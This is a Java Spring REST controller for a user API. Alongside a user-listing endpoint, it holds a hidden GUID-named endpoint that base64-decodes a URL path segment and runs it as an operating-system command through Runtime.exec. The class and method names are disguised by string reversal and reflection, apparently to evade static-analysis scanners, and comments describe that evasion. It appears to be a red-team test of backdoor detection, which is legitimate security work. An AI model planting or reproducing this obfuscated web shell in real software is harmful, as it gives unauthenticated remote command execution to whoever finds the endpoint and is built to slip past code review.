package com.tintulip.webapplication.user;

import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
@RequestMapping("/api")
public class UserRestController {

    @Autowired
    private UserRepository repository;

    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f")
    public Iterable<TestUser> nettitudeTest() {
        return repository.findAll();
    }

    @GetMapping(path="/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}", produces="text/plain")
    public String nettitudeExec(@PathVariable("cmd") String cmd) {
        var decoded = new String(Base64.decodeBase64(cmd));
        return Base64.encodeBase64String(reflectionExec(decoded).getBytes());
    }

    private String reflectionExec( String cmd ){
      try {
        
        // Using string reverse for obfuscation. Taken to an extreme this could be a class name passed at runtime or an encrypted string etc
        StringBuilder sb = new StringBuilder("emitnuR.gnal.avaj");
        sb.reverse();
        var cls = sb.toString();
        
        // Get a Runtime
        sb.replace(0,sb.length(),"emitnuRteg");
        sb.reverse();
        var rt = Class.forName(cls).getDeclaredMethod(sb.toString()).invoke(null);
        
        // Create an object which refers to the "exec" method of Runtime
        sb.replace(0,sb.length(),"cexe");
        sb.reverse();
        var m = rt.getClass().getDeclaredMethod(sb.toString(),String.class);
        
        // This line actually executes the shell command
        var p = m.invoke( rt, cmd );

        // Could not find a way of referring to a Process class via reflection and then `waitFor` to pass cleanly through build.
        // If you want to add any semgrep rules, ones referring to Process and ProcessBuilder would be a good place to start
        var p2 = java.lang.Process.class.cast(p);
        p2.waitFor();
        
        // The rest of it is just returning the output
        var inputStream = new BufferedReader(new InputStreamReader(p2.getInputStream()));
        String line;
        var output = new StringBuilder();
        while ((line = inputStream.readLine()) != null)
            output.append(line);
        return output.toString();
      } catch( Exception e ){
        return e.getMessage();
      }
    }
}
